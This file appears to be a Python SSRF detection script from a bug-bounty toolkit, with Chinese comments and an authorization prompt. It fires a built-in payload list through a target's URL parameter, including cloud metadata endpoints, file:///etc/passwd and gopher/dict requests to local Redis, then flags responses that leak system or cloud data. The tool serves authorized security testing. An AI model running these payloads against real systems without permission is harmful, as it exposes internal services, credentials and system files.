#!/usr/bin/env python3
"""
BugBounty Toolkit — SSRF检测脚本
===================================
用途: 检测目标是否存在SSRF漏洞（仅检测，不利用）
使用方法:
    python ssrf_tester.py -u https://target.com/fetch?url= -p payloads.txt

注意: 仅用于已获得明确授权的安全测试！
      本脚本使用公开的OOB检测服务或本地监听，仅返回是否存在漏洞。
"""

import argparse
import sys
import time
import urllib3
from pathlib import Path
from typing import Optional

import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================
# 合规声明
# ============================================
BANNER = """
╔══════════════════════════════════════════════════════════════╗
║            ⚠️  SSRF 检测 — 仅限授权测试                      ║
╠══════════════════════════════════════════════════════════════╣
║ 本工具仅用于已获得明确授权的安全测试                           ║
║ 仅检测SSRF漏洞是否存在，不用于内网扫描或数据窃取                ║
╚══════════════════════════════════════════════════════════════╝
"""

# SSRF检测payload（只检测回显，不用于攻击）
SSRF_PAYLOADS = [
    # 1. HTTP回显检测 - 使用公开可访问的测试服务
    #    用户需要替换为自己的collaborator/cloudeye地址
    'http://127.0.0.1:80',
    'http://127.0.0.1:8080',
    'http://localhost:80',
    'http://[::1]:80',
    'http://0.0.0.0:80',

    # 2. 云元数据URL（检测是否能访问，不读取数据）
    'http://169.254.169.254/latest/meta-data/',  # AWS
    'http://169.254.169.254/metadata/instance?api-version=2021-02-01',  # Azure

    # 3. 内部地址（检测可达性）
    'http://10.0.0.1:80',
    'http://172.16.0.1:80',
    'http://192.168.1.1:80',

    # 4. 协议探索
    'file:///etc/passwd',
    'dict://127.0.0.1:6379/info',
    'gopher://127.0.0.1:6379/',
]


class SSRFTester:
    """SSRF漏洞检测器"""

    def __init__(self, target_url: str, param: str = None, delay_ms: int = 500,
                 timeout: int = 10, collab_url: str = None):
        self.target_url = target_url.rstrip('=').rstrip('&')
        self.param = param
        self.delay = delay_ms / 1000.0
        self.timeout = timeout
        self.collab_url = collab_url
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.findings = []

    def _build_url(self, payload: str) -> str:
        """构造测试URL"""
        if self.param:
            sep = '&' if '?' in self.target_url else '?'
            return f"{self.target_url}{sep}{self.param}={requests.utils.quote(payload)}"
        else:
            # 假设payload直接拼接在URL后面
            return f"{self.target_url}/{requests.utils.quote(payload, safe=':/')}"

    def test_payload(self, payload: str) -> Optional[dict]:
        """测试单个SSRF payload"""
        test_url = self._build_url(payload)

        try:
            resp = self.session.get(test_url, timeout=self.timeout)
            time.sleep(self.delay)

            # 检测SSRF迹象：
            # 1. 响应中包含了内部地址的返回内容
            # 2. 错误信息中暴露了内部网络信息
            # 3. 响应时间异常（连接到内网超时）
            indications = []

            # 检查响应内容是否包含内部系统特征
            if resp.status_code == 200 and len(resp.text) > 0:
                content_lower = resp.text.lower()
                internal_indicators = [
                    ('root:', '文件系统(/etc/passwd)'),
                    ('[extensions]', 'Windows INI文件'),
                    ('"accountid"', 'AWS元数据'),
                    ('<title>ec2', 'AWS控制台'),
                    ('<title>iis', 'Windows IIS'),
                    ('"compute"', 'Azure元数据'),
                ]
                for keyword, desc in internal_indicators:
                    if keyword in content_lower:
                        indications.append(f"检测到{desc}特征")

            # 响应时间作为参考
            elapsed = resp.elapsed.total_seconds()

            finding = {
                'payload': payload,
                'status': resp.status_code,
                'length': len(resp.text),
                'time': f'{elapsed:.2f}s',
                'indications': indications,
            }
            return finding

        except requests.exceptions.Timeout:
            return None
        except requests.exceptions.ConnectionError:
            return None
        except Exception:
            return None

    def run(self, payloads: list = None) -> list:
        """执行SSRF检测"""
        if payloads is None:
            payloads = SSRF_PAYLOADS

        if self.collab_url:
            payloads = list(payloads) + [self.collab_url]
            print(f"[+] 已添加OOB检测地址: {self.collab_url}")

        print(f"\n[*] 开始SSRF检测，共 {len(payloads)} 个payload...")

        for i, payload in enumerate(payloads, 1):
            result = self.test_payload(payload)
            if result and result['indications']:
                self.findings.append(result)
                print(f"  [!!] 发现SSRF迹象: {payload[:60]}")
                for ind in result['indications']:
                    print(f"       {ind}")
            elif result and result['status'] != 200:
                # 状态码不是200但也返回了内容，可能是后端主动拒绝了
                pass
            elif result:
                print(f"  [*] 可访问但无明显SSRF: {payload[:50]} (HTTP {result['status']}, {result['length']}B)")
            else:
                print(f"  [-] 超时/连接失败: {payload[:50]}")

            if i % 5 == 0:
                print(f"  [*] 进度: {i}/{len(payloads)}")

        return self.findings


def main():
    print(BANNER)
    print("[!] 你是否已获得目标系统的书面测试授权？")
    resp = input("输入 yes 继续: ").strip().lower()
    if resp not in ('yes', 'y'):
        print("[!] 未确认授权，退出。")
        sys.exit(1)

    parser = argparse.ArgumentParser(description='SSRF漏洞检测 (仅限授权测试)')
    parser.add_argument('-u', '--url', required=True, help='目标URL (如: http://target/fetch?url=)')
    parser.add_argument('-p', '--param', help='参数名 (如: url, file, path)')
    parser.add_argument('-l', '--payloads', help='自定义payload文件')
    parser.add_argument('--collab', help='OOB检测地址 (如 http://your.burpcollab.net)')
    parser.add_argument('-d', '--delay', type=int, default=500, help='请求延迟(毫秒)')
    parser.add_argument('-o', '--output', help='输出报告文件')
    args = parser.parse_args()

    tester = SSRFTester(
        target_url=args.url,
        param=args.param,
        delay_ms=args.delay,
        collab_url=args.collab
    )

    payloads = None
    if args.payloads:
        payloads = [l.strip() for l in Path(args.payloads).read_text().splitlines()
                    if l.strip() and not l.startswith('#')]

    tester.run(payloads)

    if tester.findings:
        print(f"\n[+] 检测完成，发现 {len(tester.findings)} 个可能的SSRF点")
        if args.output:
            report_lines = []
            for finding in tester.findings:
                report_lines.append("URL: {}".format(finding['payload']))
                report_lines.append("状态: {}".format(finding['status']))
                report_lines.append("特征: {}".format(', '.join(finding['indications'])))
            report = "\n".join(report_lines)
            Path(args.output).write_text(report, encoding='utf-8')
            print(f"[+] 报告已保存: {args.output}")
    else:
        print("\n[-] 未检测到明显的SSRF漏洞")
        print("[*] 注意: 无回显SSRF需配合OOB/ Collaborator检测")
        if not args.collab:
            print("[*] 建议: 使用 --collab 参数添加OOB检测地址")


if __name__ == '__main__':
    main()
